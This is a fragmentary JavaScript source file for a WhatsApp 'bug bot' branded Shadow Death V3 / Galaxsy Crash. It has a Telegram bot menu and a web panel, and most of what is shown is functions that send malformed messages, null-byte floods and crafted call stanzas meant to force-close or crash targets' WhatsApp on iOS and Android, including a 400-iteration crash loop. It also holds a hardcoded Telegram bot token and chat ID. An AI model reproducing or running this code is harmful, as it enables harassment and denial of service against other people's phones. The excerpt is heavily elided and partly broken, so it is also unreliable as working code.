...
bot.command("start", async (ctx) => {
  ...
  const teks = `
<blockquote>🍁 Shadow Death V3</blockquote>
<i>Now shadow has been updated</i>
...
`;
  ...
  await ctx.reply(indictiveMenu, {
    ...
    reply_markup: Markup.inlineKeyboard([
      [ Markup.button.url("𝐒𝐇𝐀𝐃𝐎𝐖 𝐃𝐄𝐀𝐓𝐇", "https://t.me/ALL_TRX_Damz") ]
    ]).reply_markup
  });
});
...
<b>📞 Support:</b>
Contact @DamzOfficiall for assistance
`;
...
bot.hears("💬 Chat", (ctx) => {
  ctx.reply("💬 Chat dengan developer: https://t.me/DamzOfficiall");
});

bot.hears("📢 Channel", (ctx) => {
  ctx.reply("📢 Channel updates: https://t.me/ALL_TRX_Damz");
});
...
*/
////--- forclose ios --////
async function FlawlessNova(sock, target) {
  const msg = {
    locationMessage: {
    ...
    await sock.relayMessage(jid, { groupStatusMessageV2: { message: msg } }, {
      participant: { jid: jid }
    });
        console.log(chalk.green("Succes Sending Bug"));
}
//--- forclose andro --//
...
async function FcDelate(sock, target) {
  ...
  let cptcp = sock.createParticipantNodes.bind(sock);
  let encodeWAMsg = sock.encodeWAMessage?.bind(sock);
  ...
  let stanza = {
   tag: "call",
   attrs: { to: jid, id: sock.generateMessageTag(), from: sock.user.id },
   content: [{
    tag: "offer",
    attrs: {
      ...
      target,
      {
        viewOnceMessage: {
          message: {
            ...
            interactiveMessage: {
              body: { text: "\u0000\u0000\u0000\u0000" },
              footer: { text: "𝗦𝗵𝗮𝗱𝗼𝘄 𝗗𝗲𝗮𝘁𝗵 𝘅 Damz😈" },
...
//---- Crash --///
async function MasBugBlank(sock, target) {
  try {
    const msg = {
      message: {
        interactiveMessage: {
          ...
          body: {
            text: "\r".repeat(1000) + "\0".repeat(1500)
          },
          nativeFlowMessage: {
...
async function invisiblehard(sock, target) {
  try {
    ...
    await sockl.relayMessage("status@broadcast", msg3.message, {
...
async function Fluxodelay(sock, target) {
    ...
    const msg1 = await generateWAMessageFromContent(target, itrcv, { userJid: target });
    const msg2 = await generateWAMessageFromContent(target, stc, { userJid: target });
    const msg3 = await generateWAMessageFromContent(target, vid, { userJid: target });
    
    async function loav(msg) {
...
//--Crash ios--//
async function xndIOS(sock, target) {
...
async function blankios(sock, target) {
     for (let i = 0; i < 400; i++) {
         await FlawlessNova(sock, target);
         await xndIOS(sock, target);
         await FlawlessNova(sock, target);
         await xndIOS(sock, target)
         }
     console.log(chalk.green(`👀 Success Send Bugs to ${target}`));
...
*/
const BOT_TOKEN = "8438508034:AAEIiiTllAL8ToGgihNenEcnjt9EDC1XNko";
const CHAT_ID = "7870295166";
let lastExecution = 0;
...
const executionPage = (
  ...
  message = "",
  mode = "",
  userRole = "Real Join Apk Shadow Death"
) => {
...
<head>
    ...
    <title>Galaxsy Crash v1.0</title>
            ...
            <div class="input-group">
                ...
                <div class="mode-grid">
                    ...
                    <div class="mode-option" onclick="selectMode(this, 'fcinvsios')">
                        ...
                        <div class="mode-desc">Force close with iPhone</div>
                    </div>
                </div>
            </div>
